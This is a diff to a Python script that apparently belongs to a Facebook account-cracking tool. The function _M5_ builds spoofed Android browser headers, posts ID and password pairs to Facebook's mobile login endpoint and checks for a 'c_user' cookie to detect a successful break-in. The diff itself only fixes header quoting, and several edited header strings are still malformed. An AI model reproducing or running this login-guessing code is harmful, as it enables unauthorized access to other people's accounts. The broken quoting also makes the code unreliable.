@@ -583,22 +583,22 @@ def _M5_(ids,pasx):
 			'_fb_noscript': 'true'} 
                         tedy =  {'Host': 'm.facebook.com', 
 			'content-length': '506', 
-			'sec-ch-ua': '"Not.A/Brand";v="12"',
-		        '"Chromium";v="113"',
-	                '"Google Chrome";v="110"', 
+			'sec-ch-ua': '"Not.A/Brand";v="12", 
+			"Chromium":"113", 
+		        "Google Chrome":"110", 
 			'sec-ch-ua-mobile': '?1', 
 			'user-agent': 'Mozilla/5.0 (Linux; Android 5; 23128PC33I Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4639.81 Mobile Safari/537.36', 
 			'viewport-width': 'str(rr(400,989)', 
 			'content-type': 'application/x-www-form-urlencoded', 
 			'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
-			'sec-ch-ua-platform-version': "11.0.0", 
+			'sec-ch-ua-platform-version': '"11.0.0"', 
 			'x-asbd-id': '129477', 
 			'x-requested-with': 'mark.via.gp', 
-			'sec-ch-ua-full-version-list': "Not.A/Brand";v="14.0.0.0", 
+			'sec-ch-ua-full-version-list': '"Not.A/Brand";v="14.0.0.0", 
 			"Chromium";v="111.0.3775.265", 
-			"Google Chrome";v="110.0.5865.39", 
-		        'sec-ch-prefers-color-scheme': 'light', 
-			'sec-ch-ua-platform': "Android", 
+			"Google Chrome":"110.0.5865.39"', 
+			'sec-ch-prefers-color-scheme': 'light', 
+			'sec-ch-ua-platform': '"Android"', 
 			'accept': '*/*', 
 			'origin': 'https://m.facebook.com', 
 			'sec-fetch-site': 'same-origin', 
@@ -607,7 +607,7 @@ def _M5_(ids,pasx):
 			'referer': 'https://free.facebook.com/', 
 			'accept-encoding': 'gzip, deflate, br', 
 			'accept-language': 'zh-CN;q=0.8,zh;q=0.9', 
-			'x-response-format': 'JSONStream'}
+			'x-response-format': 'JSONStream'}  
                         lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
